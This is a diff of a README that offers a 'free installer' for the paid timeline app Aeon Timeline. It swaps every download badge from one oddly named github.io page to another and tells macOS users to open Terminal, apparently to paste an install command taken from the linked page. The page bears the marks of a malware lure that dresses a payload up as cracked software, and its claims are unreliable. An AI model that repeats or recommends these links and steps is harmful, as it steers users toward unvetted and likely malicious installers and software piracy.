@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Story+Planning-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Timeline+Software-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Aeon Timeline Free Installer** — Aeon Timeline is a visual timeline tool for writers, historians, and project managers. Works without internet access, no account required. Full offline installation.
+**💻 Aeon Timeline Free Installer** — Aeon Timeline is a story and project planning timeline tool for writers, project managers, and researchers. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Aeon Timeline](https://img.shields.io/badge/⬇_Install_Aeon+Timeline-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Aeon Timeline](https://img.shields.io/badge/⬇_Install_Aeon+Timeline-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Aeon Timeline
 
-Aeon Timeline is a visual timeline tool for writers, historians, and project managers. Build chronological timelines for novels, historical research, or complex projects. Connect characters, events, and locations across time periods, identify timeline inconsistencies, and synchronize with Scrivener and Ulysses. Aeon Timeline's visual approach helps writers maintain chronological consistency in complex stories.
+Aeon Timeline is a story and project planning timeline tool for writers, project managers, and researchers. It provides a visual chronological view with relationship tracking, Scrivener integration, and calendar sync — helping complex stories and projects stay organized.
 
 ---
 
 ## ❌ Problem: Aeon Timeline is hard to access
 
-- **Commercial License** — Paid application with upfront purchase cost
-- **Learning Curve** — Timeline-based story organization requires new workflow habits
-- **Sync Complexity** — Integration with writing apps requires careful configuration
-- **Large Timelines** — Very complex timelines with thousands of events can slow performance
+- **Paid License** — Requires purchase with a subscription upgrade option
+- **Steep Learning Curve** — Timeline relationships and arcs require planning before effective use
+- **Integration Dependency** — Maximum value requires using Scrivener alongside it
+- **Windows and macOS Only** — No Linux version available
 
 ---
 
@@ -61,9 +61,9 @@ Aeon Timeline is a visual timeline tool for writers, historians, and project man
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Aeon Timeline is a visual timeline tool for writers, historians, and project man
 
 <div align="center">
 
-[![⬇ Install Aeon Timeline](https://img.shields.io/badge/⬇_Install_Aeon+Timeline-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Aeon Timeline](https://img.shields.io/badge/⬇_Install_Aeon+Timeline-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Aeon Timeline is a visual timeline tool for writers, historians, and project man
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Aeon Timeline is a visual timeline tool for writers, historians, and project man
 
 ---
 
-**Aeon Timeline Free Installer** — Aeon Timeline is a visual timeline tool for writers, historians, and project managers. Install without internet connection today!
+**Aeon Timeline Free Installer** — Aeon Timeline is a story and project planning timeline tool for writers, project managers, and researchers. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Aeon Timeline](https://img.shields.io/badge/⬇_Install_Aeon+Timeline-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Aeon Timeline](https://img.shields.io/badge/⬇_Install_Aeon+Timeline-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
